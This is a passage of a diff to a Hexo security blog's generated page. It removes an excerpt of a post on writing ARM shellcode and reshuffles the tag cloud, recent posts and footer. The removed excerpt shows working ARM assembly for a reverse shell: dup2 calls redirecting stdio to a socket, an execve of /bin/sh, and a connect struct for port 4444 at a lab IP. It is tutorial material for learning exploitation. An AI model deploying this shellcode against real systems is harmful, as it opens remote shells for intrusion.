class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span>          <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 1) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>         <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#2</span>         <span class="comment">// r1 = 2 (stderr)</span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r0</span>, binsh</span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]</span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#11</span>       <span class="comment">// r7 = 11 (execve) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span>      <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span>      <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">192</span>,<span class="number">168</span>,<span class="number">139</span>,<span class="number">130</span>  <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">binsh:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2021/08/16/ARM Shellcode的编写/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -2041,35 +1838,35 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+		
+			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
+		
+			<li><a href="/tags/python/">python<span>2</span></a></li>
+		
+			<li><a href="/tags/漏洞分析/">漏洞分析<span>5</span></a></li>
+		
+			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
 		
 			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
 		
 			<li><a href="/tags/软件调试/">软件调试<span>2</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
-		
-			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
-		
-			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
-		
-			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
+			<li><a href="/tags/ARM/">ARM<span>2</span></a></li>
 		
 			<li><a href="/tags/windows内核/">windows内核<span>5</span></a></li>
 		
-			<li><a href="/tags/恶意代码分析/">恶意代码分析<span>1</span></a></li>
-		
-			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
-		
-			<li><a href="/tags/ARM/">ARM<span>2</span></a></li>
-		
-			<li><a href="/tags/漏洞分析/">漏洞分析<span>5</span></a></li>
-		
-			<li><a href="/tags/unix/">unix<span>2</span></a></li>
-		
-			<li><a href="/tags/python/">python<span>2</span></a></li>
+			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
 		
 			<li><a href="/tags/Android/">Android<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/恶意代码分析/">恶意代码分析<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/tags/CPU/">CPU<span>4</span></a></li>
 		
 		 
 		</ul>
@@ -2083,6 +1880,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/02/14/CPU乱序执行/" ><i class="fa fa-file-o"></i>CPU乱序执行</a>
+      </li>
+    
+      <li>
+        <a href="/2021/11/13/unicorn分析/" ><i class="fa fa-file-o"></i>unicorn分析</a>
+      </li>
+    
+      <li>
         <a href="/2021/09/30/一个加密木马的分析/" ><i class="fa fa-file-o"></i>一个加密木马的分析</a>
       </li>
     
@@ -2092,14 +1897,6 @@
     
       <li>
         <a href="/2021/09/17/Windbg用法/" ><i class="fa fa-file-o"></i>Windbg用法</a>
-      </li>
-    
-      <li>
-        <a href="/2021/09/09/遇到hexo莫名其妙的bug/" ><i class="fa fa-file-o"></i>遇到hexo莫名其妙的bug</a>
-      </li>
-    
-      <li>
-        <a href="/2021/09/07/CVE-2021-3156分析/" ><i class="fa fa-file-o"></i>CVE-2021-3156分析</a>
       </li>
     
   </ul>
@@ -2129,7 +1926,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2021 P1AIN0&#39;S BLOG
+  &copy; 2023 P1AIN0&#39;S BLOG
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
